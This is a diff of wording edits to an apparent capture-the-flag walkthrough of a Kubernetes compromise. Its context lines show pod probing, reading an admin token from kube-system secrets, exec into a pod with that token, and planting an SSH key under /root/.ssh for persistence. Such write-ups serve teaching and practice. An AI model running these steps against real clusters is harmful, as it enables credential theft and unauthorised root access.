@@ -253,7 +253,7 @@ The pods have the following IPs and all of them have port 3000 open:
 - 10.42.1.26
 - 10.42.1.27
 
-The response of port 3000 is the name as the application from before, but this is the development version as it seems:
+The response of port 3000 is the same as the application from before, but this is the development version as it seems:
 ```
 curl -v 10.42.1.25:3000
 ```
@@ -274,7 +274,7 @@ curl -i -s -k -X $'POST' \
 
 After sending both requests, the listener on my IP and port starts a reverse shell on _devnode-deployment-776dbcf7d6-7dxk5_ as _root_.
 
-### Lateral Movement 2
+### Lateral Movement to Host
 
 After downloading `kubectl` binary onto the pod, it also can be enumerated as the one before.
 
@@ -297,7 +297,7 @@ Listing the _secrets_ from _kube-system_:
 ./kubectl get secrets -n kube-system
 ```
 
-There are many secrets, but the _c-admin-token-9mn8w_ sounds especially interesting:
+There are many secrets, but the _c-admin-token-9mn8w_ looks especially interesting:
 ```
 ./kubectl describe secrets c-admin-token-9mn8w -n kube-system
 ```
@@ -352,7 +352,7 @@ Starting a shell in the new pod:
 ./kubectl exec alpine --stdin --tty -n kube-system --token=$(cat /tmp/token) -- /bin/sh
 ```
 
-Creating _.ssh_ directory in the _/root_ directory and adding our public SSH key into _authorized_keys_:
+Creating _/root/.ssh_ directory and adding our public SSH key into _authorized_keys_:
 ```
 mkdir /mnt/root/.ssh
 
